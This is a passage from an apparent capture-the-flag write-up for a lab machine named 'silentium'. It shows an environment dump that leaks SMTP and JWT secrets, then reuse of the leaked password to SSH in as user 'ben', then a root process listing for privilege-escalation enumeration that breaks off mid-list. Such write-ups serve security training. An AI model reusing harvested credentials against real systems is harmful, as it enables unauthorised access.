+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="nv">SMTP_PORT</span><span class="o">=</span><span class="m">1025</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="nv">SHLVL</span><span class="o">=</span><span class="m">3</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="nv">PORT</span><span class="o">=</span><span class="m">3000</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="nv">HOME</span><span class="o">=</span>/root
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="nv">SENDER_EMAIL</span><span class="o">=</span>ben@silentium.htb
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="nv">PUPPETEER_EXECUTABLE_PATH</span><span class="o">=</span>/usr/bin/chromium-browser
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="nv">JWT_ISSUER</span><span class="o">=</span>ISSUER
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="nv">JWT_AUTH_TOKEN_SECRET</span><span class="o">=</span>AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="nv">LLM_PROVIDER</span><span class="o">=</span>nvidia-nim
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="nv">SMTP_USERNAME</span><span class="o">=</span><span class="nb">test</span>
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="nv">SMTP_SECURE</span><span class="o">=</span><span class="nb">false</span>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="nv">JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES</span><span class="o">=</span><span class="m">43200</span>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="nv">FLOWISE_USERNAME</span><span class="o">=</span>ben
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="nv">DATABASE_PATH</span><span class="o">=</span>/root/.flowise
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="nv">JWT_TOKEN_EXPIRY_IN_MINUTES</span><span class="o">=</span><span class="m">360</span>
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="nv">JWT_AUDIENCE</span><span class="o">=</span>AUDIENCE
+<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a><span class="nv">SECRETKEY_PATH</span><span class="o">=</span>/root/.flowise
+<a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="nv">PWD</span><span class="o">=</span>/
+<a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="nv">SMTP_PASSWORD</span><span class="o">=</span>r04D!!_R4ge
+<a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="nv">NVIDIA_NIM_LLM_MODE</span><span class="o">=</span>managed
+<a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a><span class="nv">SMTP_HOST</span><span class="o">=</span>mailhog
+<a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="nv">JWT_REFRESH_TOKEN_SECRET</span><span class="o">=</span>AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+<a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a><span class="nv">SMTP_USER</span><span class="o">=</span><span class="nb">test</span>
+</code></pre></div>
+<p>So we can see the password for the server <code>SMTP_PASSWORD=r04D!!_R4ge</code>, lets try a ssh with the name of <code>ben</code> and the password that we found</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ssh<span class="w"> </span>ben@10.129.49.213
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>ben@10.129.49.213<span class="err">&#39;</span>s<span class="w"> </span>password:
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>ben@silentium:~$
+</code></pre></div>
+<p>So we can read the flag of the user, and now we need to make us root. We make a enumeration of services in root.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ben@silentium:~$<span class="w"> </span>ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>root
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>root<span class="w">           </span><span class="m">1</span><span class="w">  </span><span class="m">0</span>.1<span class="w">  </span><span class="m">0</span>.3<span class="w">  </span><span class="m">22160</span><span class="w"> </span><span class="m">13316</span><span class="w"> </span>?<span class="w">        </span>Ss<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:02<span class="w"> </span>/sbin/init
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>root<span class="w">           </span><span class="m">2</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kthreadd<span class="o">]</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>root<span class="w">           </span><span class="m">3</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>pool_workqueue_release<span class="o">]</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>root<span class="w">           </span><span class="m">4</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-rcu_g<span class="o">]</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>root<span class="w">           </span><span class="m">5</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-rcu_p<span class="o">]</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>root<span class="w">           </span><span class="m">6</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-slub_<span class="o">]</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>root<span class="w">           </span><span class="m">7</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-netns<span class="o">]</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>root<span class="w">           </span><span class="m">9</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/0:0H-events_highpri<span class="o">]</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>root<span class="w">          </span><span class="m">10</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/u4:0-ipv6_addrconf<span class="o">]</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>root<span class="w">          </span><span class="m">11</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-mm_pe<span class="o">]</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>root<span class="w">          </span><span class="m">12</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>rcu_tasks_kthread<span class="o">]</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>root<span class="w">          </span><span class="m">13</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>rcu_tasks_rude_kthread<span class="o">]</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>root<span class="w">          </span><span class="m">15</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>rcu_tasks_trace_kthread<span class="o">]</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>root<span class="w">          </span><span class="m">16</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>ksoftirqd/0<span class="o">]</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>root<span class="w">          </span><span class="m">17</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>rcu_preempt<span class="o">]</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>root<span class="w">          </span><span class="m">18</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>migration/0<span class="o">]</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>root<span class="w">          </span><span class="m">19</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>idle_inject/0<span class="o">]</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>root<span class="w">          </span><span class="m">20</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>cpuhp/0<span class="o">]</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>root<span class="w">          </span><span class="m">21</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>cpuhp/1<span class="o">]</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>root<span class="w">          </span><span class="m">22</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>idle_inject/1<span class="o">]</span>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>root<span class="w">          </span><span class="m">23</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>migration/1<span class="o">]</span>
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>root<span class="w">          </span><span class="m">24</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>ksoftirqd/1<span class="o">]</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>root<span class="w">          </span><span class="m">26</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/1:0H-events_highpri<span class="o">]</span>
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>root<span class="w">          </span><span class="m">29</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kdevtmpfs<span class="o">]</span>
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>root<span class="w">          </span><span class="m">30</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-inet_<span class="o">]</span>
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>root<span class="w">          </span><span class="m">31</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kauditd<span class="o">]</span>
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>root<span class="w">          </span><span class="m">32</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>khungtaskd<span class="o">]</span>
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>root<span class="w">          </span><span class="m">33</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>oom_reaper<span class="o">]</span>
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>root<span class="w">          </span><span class="m">35</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-write<span class="o">]</span>
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>root<span class="w">          </span><span class="m">37</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kcompactd0<span class="o">]</span>
+<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>root<span class="w">          </span><span class="m">38</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>SN<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>ksmd<span class="o">]</span>
+<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a>root<span class="w">          </span><span class="m">39</span><span class="w">  </span><span class="m">0</span>.2<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:06<span class="w"> </span><span class="o">[</span>kworker/1:1-events<span class="o">]</span>
+<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>root<span class="w">          </span><span class="m">40</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>SN<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>khugepaged<span class="o">]</span>
+<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a>root<span class="w">          </span><span class="m">41</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-kinte<span class="o">]</span>
+<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a>root<span class="w">          </span><span class="m">42</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-kbloc<span class="o">]</span>
+<a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a>root<span class="w">          </span><span class="m">43</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-blkcg<span class="o">]</span>
+<a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a>root<span class="w">          </span><span class="m">44</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>irq/9-acpi<span class="o">]</span>
+<a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a>root<span class="w">          </span><span class="m">45</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-tpm_d<span class="o">]</span>
+<a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a>root<span class="w">          </span><span class="m">46</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-ata_s<span class="o">]</span>
+<a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a>root<span class="w">          </span><span class="m">47</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-md<span class="o">]</span>
+<a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a>root<span class="w">          </span><span class="m">48</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-md_bi<span class="o">]</span>
+<a id="__codelineno-5-43" name="__codelineno-5-43" href="#__codelineno-5-43"></a>root<span class="w">          </span><span class="m">49</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-edac-<span class="o">]</span>
+<a id="__codelineno-5-44" name="__codelineno-5-44" href="#__codelineno-5-44"></a>root<span class="w">          </span><span class="m">50</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-devfr<span class="o">]</span>
+<a id="__codelineno-5-45" name="__codelineno-5-45" href="#__codelineno-5-45"></a>root<span class="w">          </span><span class="m">51</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>watchdogd<span class="o">]</span>
+<a id="__codelineno-5-46" name="__codelineno-5-46" href="#__codelineno-5-46"></a>root<span class="w">          </span><span class="m">53</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-quota<span class="o">]</span>
+<a id="__codelineno-5-47" name="__codelineno-5-47" href="#__codelineno-5-47"></a>root<span class="w">          </span><span class="m">54</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/1:1H-kblockd<span class="o">]</span>
+<a id="__codelineno-5-48" name="__codelineno-5-48" href="#__codelineno-5-48"></a>root<span class="w">          </span><span class="m">55</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kswapd0<span class="o">]</span>
+<a id="__codelineno-5-49" name="__codelineno-5-49" href="#__codelineno-5-49"></a>root<span class="w">          </span><span class="m">56</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>ecryptfs-kthread<span class="o">]</span>
+<a id="__codelineno-5-50" name="__codelineno-5-50" href="#__codelineno-5-50"></a>root<span class="w">          </span><span class="m">57</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-kthro<span class="o">]</span>
+<a id="__codelineno-5-51" name="__codelineno-5-51" href="#__codelineno-5-51"></a>root<span class="w">          </span><span class="m">58</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>irq/24-pciehp<span class="o">]</span>
+<a id="__codelineno-5-52" name="__codelineno-5-52" href="#__codelineno-5-52"></a>root<span class="w">          </span><span class="m">59</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>irq/25-pciehp<span class="o">]</span>
